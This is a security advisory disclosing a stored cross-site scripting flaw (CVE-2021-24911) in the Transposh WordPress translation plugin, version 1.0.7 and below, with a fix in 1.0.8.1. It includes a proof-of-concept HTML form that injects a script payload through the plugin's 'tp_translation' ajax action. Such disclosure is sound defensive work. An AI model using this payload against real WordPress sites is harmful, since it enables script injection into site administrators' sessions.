1. ADVISORY INFORMATION
=======================
Product:        Transposh WordPress Translation
Vendor URL:     https://wordpress.org/plugins/transposh-translation-filter-for-wordpress/
Type:           Cross-Site Scripting [CWE-79]
Date found:     2021-08-19
Date published: 2022-07-22
CVSSv3 Score:   6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)
CVE:            CVE-2021-24911


2. CREDITS
==========
This vulnerability was discovered and researched by Julien Ahrens from
RCE Security.


3. VERSIONS AFFECTED
====================
Transposh WordPress Translation 1.0.7 and below


4. INTRODUCTION
===============
Transposh translation filter for WordPress offers a unique approach to blog
translation. It allows your blog to combine automatic translation with human
translation aided by your users with an easy to use in-context interface.

(from the vendor's homepage)


5. VULNERABILITY DETAILS
========================
The plugin's ajax action "tp_translation" which is available to authenticated or
unauthenticated users (see CVE-2022-2461) allows to submit new translations.

Translations submitted this way are shown on the Transposh administrative
interface on the pages "tp_main" and "tp_editor". However, since the plugin does
not properly validate and sanitize the submitted translation, arbitrary Javascript
code can be permanently injected and executed directly within the backend across
all users visiting the page with the roles of at least "Subscriber" and up to
"Administrator".

This offers a wide range of possible attacks, such as redirecting the user to a
malicious page, spoofing content on the page, or attacking the browser and its
plugins.


6. PROOF OF CONCEPT
===================
The following PoC adds a new translation:

<html>
  <body>
    <form action="http://[host]/wp-admin/admin-ajax.php" method="POST">
      <input type="hidden" name="action" value="tp&#95;translation" />
      <input type="hidden" name="ln0" value="en" />
      <input type="hidden" name="sr0" value="0" />
      <input type="hidden" name="items" value="1" />
      <input type="hidden" name="tk0" value="xss&lt;script&gt;alert&#40;1337&#41;&lt;&#47;script&gt;" />
      <input type="hidden" name="tr0" value="test" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>


7. SOLUTION
===========
Update the plugin to version 1.0.8.1
